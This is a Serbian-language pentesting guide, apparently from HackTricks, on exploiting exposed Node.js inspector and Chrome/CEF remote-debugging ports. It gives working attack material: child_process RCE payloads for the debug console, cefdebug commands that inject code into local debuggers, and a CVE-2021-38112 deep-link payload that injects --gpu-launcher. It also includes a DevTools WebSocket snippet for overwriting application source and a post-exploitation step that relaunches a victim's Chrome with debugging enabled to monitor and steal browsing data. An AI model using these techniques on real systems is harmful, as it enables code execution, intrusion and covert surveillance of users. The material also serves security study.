# Zloupotreba Node inspector/CEF debug-a

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

[Iz dokumentacije](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Kada se pokrene sa `--inspect` switch-om, Node.js proces osluškuje debugging client. **Podrazumevano**, osluškivaće na host-u i portu **`127.0.0.1:9229`**. Svakom procesu se takođe dodeljuje **jedinstveni** **UUID**.<sup>[[4]](#references)</sup>

Inspector clients moraju znati i navesti adresu host-a, port i UUID da bi se povezali. Puna URL adresa izgleda otprilike ovako: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Pošto **debugger ima potpun pristup Node.js execution environment-u**, malicious actor koji može da se poveže na ovaj port može biti u mogućnosti da izvrši proizvoljan kod u ime Node.js procesa (**potential privilege escalation**).

Postoji nekoliko načina za pokretanje inspector-a:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Kada pokrenete proces koji se nadgleda, pojaviće se nešto slično ovome:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Procesi zasnovani na **CEF** (**Chromium Embedded Framework**) moraju da koriste parametar: `--remote-debugging-port=9222` kako bi otvorili **debugger** (SSRF zaštite ostaju veoma slične). Međutim, umesto da omoguće **NodeJS** **debug** sesiju, oni komuniciraju sa browserom koristeći [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), interfejs za kontrolu browsera, ali ne postoji direktan RCE.<sup>[[5]](#references)</sup>

Kada pokrenete browser sa omogućenim debug-om, pojaviće se nešto slično sledećem:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Pregledači, WebSockets i same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Websites otvorene u web-pregledaču mogu da šalju WebSocket i HTTP zahteve u okviru bezbednosnog modela pregledača. **Početna HTTP konekcija** neophodna je za **dobijanje jedinstvenog ID-ja debugger sesije**. **Same-origin-policy** **sprečava** websites da uspostave **ovu HTTP konekciju**. Radi dodatne zaštite od [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js proverava da **'Host' headers** za konekciju navode ili **IP adresu**, ili tačno **`localhost`** ili **`localhost6`**.<sup>[[12]](#references)</sup>

> [!TIP]
> Ove **security measures sprečavaju iskorišćavanje inspectora** za pokretanje koda **samo slanjem HTTP zahteva** (što bi moglo da se uradi iskorišćavanjem SSRF vuln).

### Pokretanje inspectora u procesima koji su u radu

Možete poslati **signal SIGUSR1** procesu nodejs koji je u radu kako biste ga naterali da **pokrene inspector** na podrazumevanom portu. Međutim, imajte na umu da morate imati dovoljno privilegija, pa ovo može omogućiti **privileged access to information unutar procesa**, ali ne i direktnu eskalaciju privilegija.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Ovo je korisno u kontejnerima zato što **gašenje procesa i pokretanje novog** sa `--inspect` **nije opcija**, jer će **kontejner** biti **ugašen** zajedno sa procesom.

### Povezivanje sa inspector/debugger

Da biste se povezali sa **Chromium-based browserom**, URL-ovi `chrome://inspect` ili `edge://inspect` mogu da se otvore za Chrome odnosno Edge. Klikom na dugme Configure treba proveriti da li su **ciljni host i port** ispravno navedeni. Slika prikazuje primer Remote Code Execution (RCE):

![Nakon toga će se pojaviti URL za pristup debuggeru, npr. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Povezivanje sa inspector/debugger: Da biste se povezali sa Chromium-based browserom,...](<../../images/image (674).png>)

Pomoću **komandne linije** možete se povezati sa debuggerom/inspectorom pomoću:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Alat [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) omogućava da **pronađe inspectore** koji lokalno rade i da u njih **injectuje code**.<sup>[[1]](#references)[[2]](#references)[[11]](#references)[[13]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Imajte na umu da **NodeJS RCE exploit-i neće raditi** ako ste povezani sa browser-om putem [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (morate proveriti API da biste pronašli zanimljive stvari koje možete da radite pomoću njega).

## RCE u NodeJS Debugger/Inspector-u

> [!TIP]
> Ako ste ovde došli tražeći način da dobijete [**RCE iz XSS-a u Electron-u, pogledajte ovu stranicu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Neki uobičajeni načini za dobijanje **RCE-a** kada možete da se **povežete** na Node **inspector** jesu korišćenje nečega poput sledećeg (izgleda da ovo **neće raditi pri povezivanju sa Chrome DevTools protocol-om**):<sup>[[3]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

API možete proveriti ovde: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)<sup>[[5]](#references)</sup>\
U ovom odeljku ću samo navesti zanimljive stvari za koje sam pronašao da su ih ljudi koristili za exploitovanje ovog protokola.

### Parameter Injection via Deep Links

U slučaju [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) kompanija Rhino security otkrila je da je aplikacija zasnovana na CEF-u registrovala prilagođeni UR**I** u sistemu (workspaces://index.html), koji je primao puni URI, a zatim pokretao CEF based applicatio**n** sa konfiguracijom koja je delimično konstruisana na osnovu tog URI-ja.<sup>[[8]](#references)</sup>

Otkriveno je da su parametri URI-ja bili URL decoded i korišćeni za pokretanje osnovne CEF aplikacije, što je korisniku omogućavalo da **inject** flag **`--gpu-launcher`** u **command line** i izvršava proizvoljne radnje.

Dakle, payload poput ovog:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Izvršiće calc.exe.

### Prepisivanje datoteka

Promenite fasciklu u koju će **preuzete datoteke biti sačuvane** i preuzmite datoteku kako biste **prepisali** često korišćeni **source code** aplikacije svojim **malicious code**.<sup>[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE i exfiltracija

Prema ovom postu: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148), moguće je dobiti RCE i izvršiti exfiltraciju internih stranica sa theriver-a.<sup>[[9]](#references)[[10]](#references)</sup>

### Post-Exploitation

U realnom okruženju, **nakon kompromitovanja** računara korisnika koji koristi Chrome/Chromium browser, možete pokrenuti Chrome proces sa **aktiviranim debugging-om i proslediti debugging port** kako biste mu pristupili. Na ovaj način moći ćete da **nadgledate sve što žrtva radi u Chrome-u i ukradete osetljive informacije**.<sup>[[7]](#references)</sup>

Stealth način je da **prekinete svaki Chrome proces**, a zatim pozovete nešto poput
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Reference

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger inspection and exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Visual Studio Code Remote Code Execution via Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Početak rada](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Zloupotreba Chrome-ove Debugging funkcije za daljinsko posmatranje i kontrolu sesija pregledanja](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE via DNS Rebinding and CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - From Bot to RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)

{{#include ../../banners/hacktricks-training.md}}
